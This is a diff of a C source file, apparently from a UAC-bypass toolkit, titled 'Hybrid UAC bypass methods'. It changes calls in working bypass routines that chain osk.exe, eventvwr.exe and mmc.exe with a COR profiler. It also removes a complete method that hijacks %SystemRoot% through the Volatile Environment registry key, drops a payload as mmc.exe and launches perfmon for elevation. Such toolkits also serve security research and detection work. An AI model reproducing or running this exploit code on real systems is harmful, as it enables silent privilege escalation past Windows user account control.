@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2017
+*  (C) COPYRIGHT AUTHORS, 2015 - 2018
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.85
+*  VERSION:     2.86
 *
-*  DATE:        01 Dec 2017
+*  DATE:        15 Jan 2018
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1616,14 +1616,14 @@ BOOL ucmUiAccessMethod(
         // Run uiAccess osk.exe from Program Files.
         //
         _strcat(szTarget, OSK_EXE);
-        if (supRunProcess2(szTarget, NULL, FALSE)) {
+        if (supRunProcess2(szTarget, NULL, NULL, FALSE)) {
             //
             // Run eventvwr.exe as final trigger.
             // Spawns mmc.exe with eventvwr.msc snap-in.
             //
             _strcpy(szTarget, g_ctx.szSystemDirectory);
             _strcat(szTarget, EVENTVWR_EXE);
-            bResult = supRunProcess2(szTarget, NULL, FALSE);
+            bResult = supRunProcess2(szTarget, NULL, NULL, FALSE);
         }
 
     } while (bCond);
@@ -1989,7 +1989,7 @@ BOOL ucmMethodCorProfiler(
         //
         // Load target app and trigger cor profiler, eventvwr snap-in is written in the dotnet.
         //
-        bResult = supRunProcess2(MMC_EXE, EVENTVWR_MSC, FALSE);
+        bResult = supRunProcess2(MMC_EXE, EVENTVWR_MSC, NULL, FALSE);
 
     } while (bCond);
 
@@ -2213,85 +2213,4 @@ BOOL ucmDccwCOMMethod(
     }
 
     return SUCCEEDED(r);
-}
-
-/*
-* ucmMethodVolatileEnv
-*
-* Purpose:
-*
-* Bypass UAC using self defined %SystemRoot% environment variable in "Volatile Environment" registry key.
-* For more info and examples with other targets see author site:
-* https://bytecode77.com/hacking/exploits/uac-bypass/performance-monitor-privilege-escalation
-* https://bytecode77.com/hacking/exploits/uac-bypass/sysprep-privilege-escalation
-* https://bytecode77.com/hacking/exploits/uac-bypass/remote-assistance-privilege-escalation
-* https://bytecode77.com/hacking/exploits/uac-bypass/display-languages-privilege-escalation
-* https://bytecode77.com/hacking/exploits/uac-bypass/component-services-privilege-escalation
-* https://bytecode77.com/hacking/exploits/uac-bypass/enter-product-key-privilege-escalation
-* https://bytecode77.com/hacking/exploits/uac-bypass/taskmgr-privilege-escalation
-*
-*/
-BOOL ucmMethodVolatileEnv(
-    _In_ PVOID ProxyDll,
-    _In_ DWORD ProxyDllSize
-)
-{
-    BOOL  bResult = FALSE, bCond = FALSE, bEnvSet = FALSE;
-    WCHAR szBuffer[MAX_PATH * 2];
-
-    do {
-
-        //
-        // Replace default Fubuki dll entry point with new and remove dll flag.
-        //
-        if (!supConvertDllToExeSetNewEP(ProxyDll, ProxyDllSize, FUBUKI_DEFAULT_ENTRYPOINT))
-            break;
-
-        //
-        // Create %temp%\KureND directory.
-        //
-        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
-        _strcpy(szBuffer, g_ctx.szTempDirectory);
-        _strcat(szBuffer, T_KUREND);
-
-        if (!CreateDirectory(szBuffer, NULL))
-            if (GetLastError() != ERROR_ALREADY_EXISTS)
-                break;
-
-        //
-        // Set controlled environment variable.
-        //
-        bEnvSet = supSetEnvVariable(FALSE,
-            T_VOLATILE_ENV,
-            T_SYSTEMROOT_VAR,
-            szBuffer);
-
-        if (!bEnvSet)
-            break;
-
-        //
-        // Create %temp%\KureND\system32 directory.
-        //
-        _strcat(szBuffer, SYSTEM32_DIR);
-        if (!CreateDirectory(szBuffer, NULL))
-            if (GetLastError() != ERROR_ALREADY_EXISTS)
-                break;
-
-        //
-        // Drop payload to %temp%\system32 as mmc.exe and run target with wait.
-        //
-        _strcat(szBuffer, MMC_EXE);
-        if (supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {
-            bResult = supRunProcess(PERFMON_EXE, NULL);
-        }
-
-    } while (bCond);
-
-    //
-    // Cleanup if requested.
-    //
-    if (bEnvSet)
-        supSetEnvVariable(TRUE, T_VOLATILE_ENV, T_SYSTEMROOT_VAR, NULL);
-
-    return bResult;
 }
